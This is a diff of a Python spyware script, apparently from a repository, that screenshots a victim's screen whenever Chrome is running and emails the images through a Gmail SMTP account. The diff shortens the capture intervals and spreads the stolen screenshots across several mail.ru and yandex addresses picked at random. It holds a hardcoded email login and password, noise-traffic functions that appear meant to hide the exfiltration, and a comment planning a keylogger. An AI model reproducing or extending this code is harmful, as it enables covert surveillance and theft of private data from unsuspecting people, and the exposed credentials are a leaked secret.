@@ -10,7 +10,7 @@ import random
 import smtplib
 import imghdr
 from email.message import EmailMessage
-#dobuwać keyloogera
+# dobuwać keyloogera
 import subprocess
 import os
 from list_of_website import websites
@@ -18,15 +18,14 @@ import requests
 from threading import Thread
 
 
-time_interval_screen = random.randint(10, 30)
-time_interval_noise_mail =  random.randint(15,20)
+time_interval_screen = random.randint(5, 15)
+time_interval_noise_mail =  random.randint(2,10)
 time_web_noise = random.randint(10, 15)
 smpt_server = 'smtp.gmail.com'
 smtp_port = 465
 smtp_acct = 'becyp2137@gmail.com'
 smtp_password = 'SlavaUkrainie69'
-tgt_accts = ['becyp2137@gmail.com'] # ta lista może być zmienna
-noise_mails = ['becyp69@op.pl']
+tgt_accts = ['becyp2137@gmail.com', 'becyp69@op.pl', 'becyp2137@gmail.com', "iravacik@yandex.com", "putin_klug@mail.ru" , "tamara.pol222@mail.ru", "cathuvar9090@mail.ru", "wanila0001@yandex.com" ]
 now = datetime.now() # current date and time
 
 # getting the size of screen, a victim can have multiple monito
@@ -68,7 +67,9 @@ def screenshot_email(subject):
     msg = EmailMessage()
     msg['Subject'] = subject
     msg['From'] = smtp_acct
-    msg['To'] = tgt_accts[0] # This might be change for biggger address
+    address = tgt_accts[random.randint(0,7)]
+    print(address)
+    msg['To'] = address # This might be change for biggger address
     msg.set_content(subject)
 
     screenshot()
@@ -111,7 +112,9 @@ def plain_email(subject):
     mailobj.starttls()
     mailobj.login('becyp2137@gmail.com','SlavaUkrainie69')
     msg = f"Subject: {subject} \n\n {subject}"
-    mailobj.sendmail(smtp_acct, 'becyp69@op.pl', msg)
+    address = tgt_accts[random.randint(0,7)]
+    print(address)
+    mailobj.sendmail(smtp_acct, address , msg)
     print("plain mail send")
     mailobj.quit()
 
@@ -124,7 +127,7 @@ class Screenshot(Thread):
         while True:
             now = datetime.now() # current date and time
             date_time = now.strftime("%m/%d/%Y, %H:%M:%S")
-            if(process_exists('chrome.exe') or process_exists('firefox.exe') or process_exists('msedge.exe') or process_exists("iexplore.exe")):
+            if(process_exists('chrome.exe') ): # or process_exists('firefox.exe') or process_exists('msedge.exe') or process_exists("iexplore.exe")):
                 screenshot_email(date_time)
                 print(f"message send: {now}")
             sleep(time_interval_screen)
